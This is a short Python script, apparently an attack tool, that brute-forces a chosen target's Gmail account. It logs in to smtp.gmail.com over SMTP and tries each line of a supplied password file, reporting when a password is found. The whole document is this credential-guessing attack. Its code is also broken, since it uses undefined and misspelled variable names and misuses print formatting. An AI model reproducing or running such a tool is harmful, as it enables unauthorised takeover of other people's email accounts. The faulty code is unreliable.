import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter the target's email: ")
passwfile = raw_input("Enter the password File: ")
passwfile = open(passwfile, "r")

for i in passwfile :
      try :
            smtpserver.login(user, password)
            print ("[+] password Found ==> %s") % passoword
            break;

      except smtplib.SMTPAuthenticationError:
            print ("[!] Passwrd is incorrect ==> %s ") % password
